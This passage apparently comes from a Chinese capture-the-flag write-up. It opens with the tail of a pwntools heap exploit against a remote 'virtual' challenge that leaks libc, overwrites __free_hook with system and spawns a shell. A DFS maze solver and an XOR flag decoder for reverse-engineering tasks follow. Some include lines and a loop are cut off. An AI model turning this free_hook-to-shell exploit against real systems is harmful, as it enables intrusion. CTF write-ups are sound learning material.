        return p8(6) + p8(size)
    def free():
        return p8(7)
    def brk():
        return p8(8)
    def sub5_size(size):
        all = ""
        while size != 0:
            if size >= 8:
                all += sub_helper(8)
                size -= 8
            elif size >= 4:
                all += sub_helper(4)
                size -= 4
            elif size >= 2:
                all += sub_helper(2)
                size -= 2
            else:
                all += sub_helper(1)
                size -= 1
        return all
    def sub_one():
        return p8(4) + p8(0x10)
    # r = process('./virtual')
    r = remote('111.231.70.44', 28112)
    # part 1
    payload = add(0x88) + free() + add(0x18) + free() + add(0x88) + sub5_size(0x127) + sub_one() + sub5_size(
        0x172) + write5('\xFF') + free() + add(0x28) + show() + sub5_size(0x100) + brk()
    r.sendafter("code :", payload)
    # leak libc
    malloc_hook_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 224 - 0x10
    log.success("malloc_hook_addr: " + hex(malloc_hook_addr))
    libc = LibcSearcher('__malloc_hook', malloc_hook_addr)
    libc_base = malloc_hook_addr - libc.dump('__malloc_hook')
    log.success("libc_base: " + hex(libc_base))
    free_hook_addr = libc_base + libc.dump('__free_hook')
    log.success("free_hook_addr: " + hex(free_hook_addr))
    system_addr = libc_base + libc.dump('system')
    log.success("system_addr: " + hex(system_addr))
    # part 2
    payload2 = sub5_size(0x260) + write5(p64(free_hook_addr - 0x8)) + free() + add(0x18) + write5('/bin/sh\x00') + write5(
        p64(system_addr)) + free() + brk()
    r.sendafter("code :", payload2)
    r.interactive()
## RE
###  A-Maze-In
有个迷宫，但是我也没搞懂怎么样的迷宫，根据程序逻辑，写了个DFS就秒掉了（带了个记忆化搜索）。
    #include 
    unsigned char ida_chars[] =
    {
      0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00,
      0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00,
      0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00,
      0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00,
      0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
      0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00
    };
    char way[34];
    int vis[35][35][35];
    int dfs(int x, int v5, int v4)
    {
        if (vis[x][v5][v4]) return vis[x][v5][v4];
        if (x == 34)
        {
            if (v5 == 7 && v4 == 4)
                return vis[x][v5][v4] = 1;
            return vis[x][v5][v4] = 2;
        }
        if (ida_chars[32 * v5 + 4 * v4] == 1)
            if (dfs(x + 1, v5 - 1, v4) == 1)
            {
                way[x] = 'U';
                return vis[x][v5][v4] = 1;
            }
        if (ida_chars[32 * v5 + 1 + 4 * v4] == 1)
            if (dfs(x + 1, v5 + 1, v4) == 1)
            {
                way[x] = 'D';
                return vis[x][v5][v4] = 1;
            }
        if (ida_chars[32 * v5 + 2 + 4 * v4] == 1)
            if (dfs(x + 1, v5, v4 - 1) == 1)
            {
                way[x] = 'L';
                return vis[x][v5][v4] = 1;
            }
        if (ida_chars[32 * v5 + 3 + 4 * v4] == 1)
            if (dfs(x + 1, v5, v4 + 1) == 1)
            {
                way[x] = 'R';
                return vis[x][v5][v4] = 1;
            }
        return vis[x][v5][v4] = 2;
    }
    int main()
    {
        dfs(0, 0, 3);
        for (int i = 0; i 
    #include 
    int main()
    {
        char ans[] = "@lgvjocWzihodmXov[EWO";
        for (int idx = 0, x; idx < (strlen(ans) + 1) / 2; idx = x)
        {
            x = idx + 1;
            ans[idx] = ans[idx] ^ x;
            int v3 = strlen(ans) - 1 - idx;
            ans[v3] = ans[v3] ^ x;
        }
        printf("%s", ans);
        return 0;
    }